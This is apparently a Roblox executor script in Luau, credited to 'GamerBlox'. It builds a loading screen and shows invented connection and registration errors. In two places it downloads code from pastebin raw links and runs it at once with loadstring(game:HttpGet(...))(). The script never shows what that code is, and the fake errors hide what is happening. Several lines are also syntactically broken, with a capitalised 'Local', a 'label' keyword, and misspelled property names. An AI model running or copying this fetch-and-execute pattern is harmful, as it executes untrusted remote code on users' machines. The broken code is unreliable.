-- THIS SCRIPT HAS BEEN MADE IN LUAU
-- Official Script By GamerBlox.
-- Please Use Another Script.
-- site8560.wordpress.com/home
-- https://discord.gg/NcfeXGqpYE

wait(0.5)
print("Loading HttpGet...")

wait(0.5)
local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local loadingGui = Instance.new("ScreenGui")
loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
loadingGui.Name = "Loading..."
loadingGui.IgnoreGuiInset = true
loadingGui.Parent = playerGui

local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "GamerBloxUser"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundTransparency = 0.1
loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
loadingFrame.Draggable = false
loadingFrame.Visible = true
loadingFrame.ZIndex = 1000
loadingFrame.Parent = loadingGui

local GamerBloxImageLabel = Instance.new("ImageButton")
GamerBloxImageLabel.Name = "GamerBloxImageLabel"
GamerBloxImageLabel.Size = UDim2.new(0, 75, 0, 75)
GamerBloxImageLabel.Position = UDim2.new(0.465, 0, 0.2, -25)
GamerBloxImageLabel.BackgroundTransparency = 0.5
GamerBloxImageLabel.BackgroundColor3 = Color3.fromRGB(110, 110, 110)
GamerBloxImageLabel.Image = "https://www.roblox.com/library/11569027959/Gamer-blox"
GamerBloxImageLabel.Draggable = false
GamerBloxImageLabel.Visible = true
GamerBloxImageLabel.ZIndex = 1000
GamerBloxImageLabel.Parent = loadingFrame

local loadingtextLabel = Instance.new("TextLabel")
loadingtextLabel.Name = "TextLabel"
loadingtextLabel.Size = UDim2.new(1, 0, 1, 0)
loadingtextLabel.Position = UDim2.new(0, 0, 0, 25)
loadingtextLabel.BackgroundTransparency = 1
loadingtextLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
loadingtextLabel.Font = Enum.Font.GothamMedium
loadingtextLabel.TextColor3 = Color3.new(1, 1, 1)
loadingtextLabel.TextSize = 30
loadingtextLabel.Text = "Loading GamerBlox.xml"
loadingtextLabel.Draggable = false
loadingtextLabel.Visible = true
loadingtextLabel.ZIndex = 1000
loadingtextLabel.Parent = loadingFrame

-- ReplicatedFirst:RemoveDefaultLoadingScreen()

wait(7)
print("GamerBlox Script Is Executed!")

wait(0.5)
loadingtextLabel.Text = "Loaded GamerBlox.xml"
loadingtextLabel.TextSize = 35

wait(0.5)
local mainGui = Instance.new("ScreenGui")
mainGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
mainGui.Name = "GamerBloxGui"
mainGui.IgnoreGuiInset = true
mainGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "Frame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundTransparency = 1
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
mainFrame.Draggable = false
mainFrame.Visible = true
mainFrame.ZIndex = 999
mainFrame.Parent = mainGui

local versionLabel = Instance.new("TextButton")
versionLabel.Name = "Version"
versionLabel.Size = UDim2.new(0, 100, 0, 20)
versionLabel.Position = UDim2.new(1, -120, 1, -30)
versionLabel.BackgroundTransparency = 1
versionLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
versionLabel.Font = Enum.Font.GothamMedium
versionLabel.TextColor3 = Color3.new(1, 1, 1)
versionLabel.TextSize = 11
versionLabel.Text = "Script Version: 0.4v"
versionLabel.Draggable = false
versionLabel.Visible = true
versionLabel.ZIndex = 999
versionLabel.Parent = mainFrame

local GBScript = Instance.new("Script")
GBScript.Name = "GamerBlox"
GBScript.Enabled = false
GBScript.Parent = versionLabel

local GamerBloxImageLabel = Instance.new("ImageButton")
GamerBloxImageLabel.Name = "GamerBloxImageLabel"
GamerBloxImageLabel.Size = UDim2.new(0.25, 0, 0.25, 0)
GamerBloxImageLabel.Position = UDim2.new(0.1, 0, 0.1, 0)
GamerBloxImageLabel.BackgroundTransparency = 0.5
GamerBloxImageLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GamerBloxImageLabel.Image = "https://www.roblox.com/library/11569027959/Gamer-blox"
GamerBloxImageLabel.Draggable = true
GamerBloxImageLabel.Visible = false
GamerBloxImageLabel.ZIndex = 999
GamerBloxImageLabel.Parent = mainFrame

local GBFrame = Instance.new("Frame")
GBFrame.Name = "GBFramer"
GBFrame.Size = UDim2.new(1, 0, 1, 0)
GBFrame.Position = UDim2.new(0, 0, 0, 0)
GBFrame.BackgroundTransparency = 1
GBFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GBFrame.Visible = true
GBFrame.ZIndex = 999
GBFrame.Parent = mainGui

local GBTextLabel = Instance.new("TextLabel")
GBTextLabel.Name= "GBTextLabel"
GBTextLabel.Size = UDim2.new(1, 0, 1, 0)
GBTextLabel.Position = UDim2.new(0, 0, 0, 0)
GBTextLabel.Font = Enum.Font.GothamMedium
GBTextLabel.Text = "GamerBlox.xml"
GBTextLabel.TextColor3 = Color3.new(1, 1, 1)
GBTextLabel.TextSize = 10
GBTextLabel.BackgroundTransparency = 1
GBTextLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GBTextLabel.Visible = false
GBTextLabel.ZIndex = 999
GBTextLabel.Parent = GBFrame

wait(1)
warn("Error connection HttpGet services")
loadingGui.Enabled = false

wait(0.5)
game.StarterGui:SetCore("SendNotification", {
Title = "GamerBlox.xml";
Text = "Script Created By GamerBlox";
Icon = "https://www.roblox.com/library/11569027959/Gamer-blox";
Duration = 2.5;
})

wait(0.1)
warn("The Https://site8560.wordpress.com Have Problems...")

wait(3)
game.StarterGui:SetCore("SendNotification", {
Title = "GamerBlox.xml";
Text = "Script Not Loaded, Please Wait Until Tomorrow...";
Icon = "https://www.roblox.com/library/11569027959/Gamer-blox";
Duration = 5;
})

wait(0.25)
warn("Error Connection HttpGet Services.")

wait (0.25)
warn("Error Connection Passport.html Services.")

wait(0.25)
warn("Error Access To Guest.")

wait(0.25)
print("Finding Passport User...")
warn("Not Found Correctly Loadstring.")

local GamerBloxUser = Instance.new("TextButton")
GamerBloxUser.Name = "GamerBloxUser"
GamerBloxUser.Size = UDim2.new(0, 100, 0, 20)
GamerBloxUser.Position = UDim2.new(1, -120, 1, -50)
GamerBloxUser.BackgroundTransparency = 1
GamerBloxUser.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GamerBloxUser.Font = Enum.Font.GothamMedium
GamerBloxUser.TextColor3 = Color3.new(1, 1, 1)
GamerBloxUser.TextSize = 11
GamerBloxUser.Text = "Not Registered!"
GamerBloxUser.Draggable = false
GamerBloxUser.Visible = true
GamerBloxUser.ZIndex = 999
GamerBloxUser.Parent = mainFrame

local EXIT = Instance.new("TextButton")
EXIT.Name = "EXIT"
EXIT.Size = UDim2.new(0, 30, 0, 30)
EXIT.Position = UDim2.new(0.1, 0, 0.1, 0)
EXIT.BackgroundTransparency = 0.5
EXIT.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
EXIT.Font = Enum.Font.GothamMedium
EXIT.TextColor3 = Color3.new(0.1, 0.1, 0.1)
EXIT.TextSize = 11
EXIT.Text = "EXIT"
EXIT.Draggable = true
EXIT.Visible = true
EXIT.ZIndex = 999
EXIT.Parent = mainFrame

local FulledScreen = Instance.new("ScreenGui")
FulledScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FulledScreen.Name = "FulledScreen"
FulledScreen.IgnoreGuilnset = true
FulledScreen.Parent = mainGui

local FulledFrame = Instance.new("Frame")
FulledFrame.Name = "FulledFrame"
FulledFrame.Size = UDim2.new(1, 0, 1, 0)
FulledFrame.Position = UDim2.new(0, 0, 0, 0)
FulledFrame.BackgroundTransparency = 1
FulledFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FulledFrame.Draggable = false
FulledFrame.Visible = false
FulledFrame.ZIndex = 999
FulledFrame.Parent = FulledScreen

wait(0.5)
warn("You Not Registered Our Site.")
loadstring(game:HttpGet("https://pastebin.com/raw/wE1A3cs1", true))()

wait(1)
print("Removing LoadingGui...")

wait(0.5)
print("Add FOG...")

wait(0.5)
Local MakeMeDark = Instance.new("Frame")
MakeMeDark.Name = FOG
MakeMeDark.Size = UDim2.new(1, 0, 1, 0)
MakeMeDark.Position = UDim2.new(0, 0, 0, 0)
MakeMeDark.BackroundTransparency = 0.05
MakeMeDark.BackroundColor3 = Color3.fromRGB(0, 0, 0)
MakeMeDark.Draggable = false
MakeMeDark.Visible = true
MakeMeDark.ZIndex = 999
MakeMeDark.Parent = FulledScreen

wait(1)
print("Reload Menu...")

wait(3)
print("GamerBlox Script Fully Executed.")
loadingGui:Destroy()

label Animation = Instance.new("Animation")
Animation.Name = "Animation"
Animation.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Official Script Search Engine
-- not done.

-- Functions
print("Empty HttpGet Scripts Attach")
loadstring(game:HttpGet("https://pastebin.com/raw/984nm0Hp", true))()
